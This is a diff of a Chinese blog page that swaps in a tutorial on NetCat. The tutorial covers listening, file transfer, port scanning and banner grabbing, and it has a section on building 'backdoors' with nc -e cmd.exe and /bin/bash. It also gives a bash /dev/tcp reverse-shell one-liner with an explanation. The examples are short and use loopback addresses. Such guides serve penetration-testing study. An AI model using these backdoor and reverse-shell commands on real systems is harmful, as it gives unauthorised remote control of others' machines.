@@ -2,19 +2,24 @@
 <html lang="zh">
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-<title>标签: Termux - Ox400</title>
+<title>NetCat瑞士军刀使用详解 - Ox400</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 
 
-    <meta property="og:type" content="website">
-<meta property="og:title" content="Ox400">
-<meta property="og:url" content="http://yoursite.com/tags/Termux/index.html">
+    <meta name="description" content="在网络工具中有“瑞士军刀”美誉的NetCat， 在我们用了N年了至今仍是爱不释手。">
+<meta name="keywords" content="工具">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NetCat瑞士军刀使用详解">
+<meta property="og:url" content="http://yoursite.com/passagesNetCat瑞士军刀使用详解/index.html">
 <meta property="og:site_name" content="Ox400">
+<meta property="og:description" content="在网络工具中有“瑞士军刀”美誉的NetCat， 在我们用了N年了至今仍是爱不释手。">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://yoursite.com/images/og_image.png">
+<meta property="og:updated_time" content="2019-10-26T07:42:32.268Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Ox400">
+<meta name="twitter:title" content="NetCat瑞士军刀使用详解">
+<meta name="twitter:description" content="在网络工具中有“瑞士军刀”美誉的NetCat， 在我们用了N年了至今仍是爱不释手。">
 <meta name="twitter:image" content="http://yoursite.com/images/og_image.png">
 
 
@@ -93,7 +98,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/logo.svg" alt="Ox400" height="28">
+                <img src="/images/logo.svg" alt="NetCat瑞士军刀使用详解" height="28">
             
             </a>
         </div>
@@ -139,52 +144,127 @@
         <div class="container">
             <div class="columns">
                 <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
-    <div class="card-content">
-        <nav class="breadcrumb" aria-label="breadcrumbs">
-        <ul>
-            <li><a href="/tags">标签</a></li>
-            <li class="is-active"><a href="#" aria-current="page">Termux</a></li>
-        </ul>
-        </nav>
-    </div>
-</div>
-
-    <div class="card">
     
     <div class="card-content article ">
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-07-10T12:44:45.000Z">2019-07-10</time>
+                <time class="level-item has-text-grey" datetime="2019-10-25T08:18:21.000Z">2019-10-25</time>
                 
                 
                 <span class="level-item has-text-grey">
                     
                     
-                    6 分钟 读完 (大约 947 个字)
+                    5 分钟 读完 (大约 703 个字)
                 </span>
                 
+                
+                <span class="level-item has-text-grey" id="busuanzi_container_page_pv">
+                    <i class="far fa-eye"></i>
+                    <span id="busuanzi_value_page_pv">0</span>次访问
+                </span>
                 
             </div>
         </div>
         
         <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
             
-                <a class="has-link-black-ter" href="/passagesTermux打造Android端渗透测试工具集/">Termux打造Android端渗透测试工具集</a>
+                NetCat瑞士军刀使用详解
             
         </h1>
         <div class="content">
-            <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="/images/Termux1.jpg" alt="Termux"><br>Termux是Android的终端模拟器。它与其他终端仿真器的主要区别在于它自己的软件包存储库以及大量的各种实用程序。<br>终端模拟器是一个为shell提供基于文本的界面的程序</p>
+            <p>在网络工具中有“瑞士军刀”美誉的NetCat， 在我们用了N年了至今仍是爱不释手。</p>
+<p><img src="/images/NetCat.jpg" alt><a id="more"></a></p>
+<h2 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a><strong>基础使用</strong></h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l  -p 4444</span><br></pre></td></tr></table></figure>
+
+<p>创建NetCat 服务器端 并监听4444端口</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  127.0.0.1 4444</span><br></pre></td></tr></table></figure>
+
+<p>连接到NetCat服务器127.0.0.1的4444端口</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  -w3 127.0.0.1 4444</span><br></pre></td></tr></table></figure>
+
+<p>如果三秒未连接上则结束会话</p>
+<h2 id="返回shell"><a href="#返回shell" class="headerlink" title="返回shell"></a><strong>返回shell</strong></h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 444 -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>创建NetCat 服务器端 并监听4444端口 返回cmd执行</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 4444</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a><strong>文件传输</strong></h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444  &gt; outfile.txt</span><br></pre></td></tr></table></figure>
+
+<p>服务器端接收文件并转储到outfile.txt </p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 4444 &lt; /home/1.txt</span><br></pre></td></tr></table></figure>
+
+<p>传输文件1.txt到127.0.0.1</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444  &lt; /home/1.txt</span><br></pre></td></tr></table></figure>
+
+<p>服务器发送</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 4444 &gt; outfile.txt</span><br></pre></td></tr></table></figure>
+
+<p>接收</p>
+<h2 id="NetCat-内网端口服务信息探测"><a href="#NetCat-内网端口服务信息探测" class="headerlink" title="NetCat 内网端口服务信息探测"></a><strong>NetCat 内网端口服务信息探测</strong></h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -n -v -w1 -z 127.0.0.1 1-65535</span><br></pre></td></tr></table></figure>
+
+<p>-n 不进行dns解析</p>
+<p>-v  对错误进行详细输出(版本信息)</p>
+<p>-z  zero I/O模式 专用于端口扫描。表示对目标不发送payload</p>
+<p>-w1 超时一秒</p>
+<h2 id="Banner信息抓取"><a href="#Banner信息抓取" class="headerlink" title="Banner信息抓取"></a><strong>Banner信息抓取</strong></h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot; &quot; | nc -v -n -w1 127.0.0.1 1-65535</span><br></pre></td></tr></table></figure>
+
+<p>给每个端口发送一条信息通过管道符传递</p>
+<h2 id="建立后门"><a href="#建立后门" class="headerlink" title="建立后门"></a><strong>建立后门</strong></h2><h4 id="监听型后门"><a href="#监听型后门" class="headerlink" title="监听型后门"></a>监听型后门</h4><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc64.exe -l -p 4444 -e cmd.exe windows</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h4 id="连接型后门"><a href="#连接型后门" class="headerlink" title="连接型后门"></a>连接型后门</h4><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  127.0.0.1 4444 -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  127.0.0.1 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h4 id="连接内网转发"><a href="#连接内网转发" class="headerlink" title="连接内网转发"></a><strong>连接内网转发</strong></h4><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l  -p 4444 (127.0.0.2)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 127.0.0.1 4444 &gt;delay.bat</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l   -p 4445 -e delay.bat</span><br></pre></td></tr></table></figure>
+
+<p>(127.0.0.1转发到127.0.0.2)</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 4445</span><br></pre></td></tr></table></figure>
+
+<h2 id="反弹shell（适用于不存在nc的服务器）"><a href="#反弹shell（适用于不存在nc的服务器）" class="headerlink" title="反弹shell（适用于不存在nc的服务器）"></a><strong>反弹shell（适用于不存在nc的服务器）</strong></h2><p>先客户端监听</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>再服务器连接</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>bash -i表示以交互模式运行bash shell ，文件描述符号&gt;&amp;其意义为重定向如果其后为文件则将bash shell交互模式传递给文件， bash -i &gt;&amp;是bash shell以交互模式运行并传递给文件。/dev/tcp/127.0.0.1/4444表示传递给远程主机的ip地址和端口</p>
+<p>文件描述符： 0 标准输入 1 标准输出 2 错误输入输出</p>
+<p>命令中的 0&gt;&amp;1 表示将标准输入重定向到标准输出，实现远程的输入可以在远程输出对应内容。</p>
+<h2 id="help"><a href="#help" class="headerlink" title="help"></a><strong>help</strong></h2><p>-d 脱离窗口 后台运行</p>
+<p>-e 执行某个程序</p>
+<p>-G geteway 设置网关，常用于突破内网限制</p>
+<p>-g num 路由跳数</p>
+<p>-i sec  设置发送每行数据的时间间隔秒</p>
+<p>-l 设置netcat监听状态等待连接</p>
+<p>-L 一直监听客户端断开进入等待</p>
+<p>-n 设置netcat只识别ip地址，不在进行dns解析</p>
+<p>-o file 设置传输十六进制数据</p>
+<p>-p 设置监听端口号</p>
+<p>-r 设置netcat 随机监听</p>
+<p>-s addr 设置netcat源地址  可设置其他地址隐藏自己</p>
+<p>-t 回复telnet的请求回复包</p>
+<p>-u 使用udp模式（默认使用tcp协议）当tcp连接被过滤可绕过</p>
+<p>-v 显示版本信息等</p>
+<p>-w 设置连接超时值 （秒）</p>
+<p>-z  zero扫描模式不包含payload 缩短扫描时间</p>
+
         </div>
         
-        
-        <div class="level is-mobile">
+        <div class="level is-size-7 is-uppercase">
             <div class="level-start">
                 <div class="level-item">
-                <a class="button is-size-7 is-light" href="/passagesTermux打造Android端渗透测试工具集/#more">阅读更多</a>
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/工具/">工具</a>
                 </div>
             </div>
         </div>
+        
         
         
     </div>
@@ -192,9 +272,74 @@
 
 
 
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3>
+        <div class="buttons is-centered">
+            
+                
+<a class="button is-info donate">
+    <span class="icon is-small">
+        <i class="fab fa-alipay"></i>
+    </span>
+    <span>支付宝</span>
+    <div class="qrcode"><img src="http://tool.oschina.net/action/qrcode/generate?data=https%3A%2F%2Fqr.alipay.com%2Ffkx00381pgkkpoacxqj7313&amp;output=image%2Fpng&amp;error=L&amp;type=0&amp;margin=0&amp;size=4" alt="支付宝"></div>
+</a>
+
+                
+                
+<a class="button is-success donate">
+    <span class="icon is-small">
+        <i class="fab fa-weixin"></i>
+    </span>
+    <span>微信</span>
+    <div class="qrcode"><img src="http://tool.oschina.net/action/qrcode/generate?data=wxp%3A%2F%2Ff2f03Us4DhfijZe-PhRgOHV3yfhgKzlaz6d-&amp;output=image%2Fjpeg&amp;error=L&amp;type=0&amp;margin=0&amp;size=4&amp;1562314189430" alt="微信"></div>
+</a>
+
+                
+                <!-- Visit https://www.paypal.com/donate/buttons/ to get your donate button -->
+
+<a class="button is-warning donate" onclick="document.getElementById(&#39;paypal-donate-form&#39;).submit()">
+    <span class="icon is-small">
+        <i class="fab fa-paypal"></i>
+    </span>
+    <span>Paypal</span>
+</a>
+<form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank" id="paypal-donate-form">
+    <input type="hidden" name="cmd" value="_donations">
+    <input type="hidden" name="business" value="2211921910@qq.com">
+    <input type="hidden" name="currency_code" value="USD">
+</form>
+
+                
+                
+<a class="button is-danger donate" href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&amp;hosted_button_id=9LTEPDCWXM8RW&amp;source=url" target="_blank">
+    <span class="icon is-small">
+        <i class="fab fa-patreon"></i>
+    </span>
+    <span>Patreon</span>
+</a>
+
+                
+        </div>
+    </div>
+</div>
 
 
 
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/passages悬剑单兵武器库/">
+                <span class="level-item">圈子红队公益系列-悬剑单兵武器库</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
 
 
 </div>
@@ -993,7 +1138,7 @@
             <div class="level-start has-text-centered-mobile">
                 <a class="footer-logo is-block has-mb-6" href="/">
                 
-                    <img src="/images/logo.svg" alt="Ox400" height="28">
+                    <img src="/images/logo.svg" alt="NetCat瑞士军刀使用详解" height="28">
                 
                 </a>
                 <p class="is-size-7">
